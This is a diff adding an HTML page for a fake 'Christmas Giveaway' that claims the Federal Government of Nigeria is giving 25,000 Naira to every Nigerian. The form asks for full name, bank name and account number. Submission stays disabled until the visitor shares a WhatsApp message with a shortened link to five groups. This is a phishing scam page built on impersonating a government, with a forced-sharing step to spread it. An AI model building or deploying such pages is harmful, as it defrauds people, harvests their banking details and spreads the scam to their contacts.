@@ -1,0 +1,57 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Christmas Giveaway</title>
+  <link rel="stylesheet" href="style.css"
+</head>
+<body>
+  <h1>Christmas Giveaway </h1>
+  <p>The Federal Government of Nigeria is giving away 25,000 Naira to all Nigerians! Fill out the form below to participate.</p>
+
+  <form id="giveawayForm" onsubmit="submitForm(event)">
+    <label for="fullName">Full Name:</label>
+    <input type="text" id="fullName" name="fullName" required>
+
+    <label for="nationality">Nationality:</label>
+    <select id="nationality" name="nationality" required>
+      <option value="Nigeria">Nigeria</option>
+      <option value="Ghana">Ghana</option>
+      <option value="Cameroon">Cameroon</option>
+      <option value="Other">Other</option>
+      <!-- Add more countries as needed -->
+    </select>
+
+    <label for="age">Age:</label>
+    <select id="age" name="age" required>
+      <option value="18-25">18-25</option>
+      <option value="26-35">26-35</option>
+      <option value="36-50">36-50</option>
+    </select>
+
+    <label for="bankName">Bank Name:</label>
+    <input type="text" id="bankName" name="bankName" required>
+
+    <label for="accountNumber">Account Number:</label>
+    <input type="text" id="accountNumber" name="accountNumber" required>
+
+    <a href="whatsapp://send?text=Join the Christmas giveaway by the federal government of Nigeria: https://rb.gy/tavf1a" target="_blank">
+      <button type="button" onclick="shareToGroups()">Share to 5 Groups</button>
+    </a>
+
+    <div class="counter" id="shareCounter">Shares: 0</div>
+
+    <button type="submit" id="submitButton" disabled>Submit</button>
+
+    <!-- Redirect Button -->
+    <a href="#" class="redirect-button">Check Your Profile</a>
+  </form>
+  <script src="script.js"></script>
+</body>
+</html>
+  <div class="article">
+    <h2>About the Christmas Giveaway</h2>
+    <p>This initiative is proudly prepared by the Federal Government of Nigeria as a gesture to enhance the Christmas celebration for everyone, especially those in need. The government is sharing a total of 25,000 Naira to make sure that even the less fortunate can join in the festive spirit. We believe in spreading joy and warmth during this special season.</p>
+  </div>
+
+</html>
